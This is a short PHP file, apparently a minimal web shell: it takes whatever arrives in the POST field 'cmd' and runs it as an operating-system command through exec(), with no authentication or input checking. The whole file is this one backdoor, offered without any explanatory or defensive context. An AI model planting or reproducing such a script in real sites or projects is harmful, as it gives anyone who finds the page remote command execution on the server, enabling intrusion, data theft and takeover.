<?php
function execute($com)
{
    exec($com,$arr);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
?>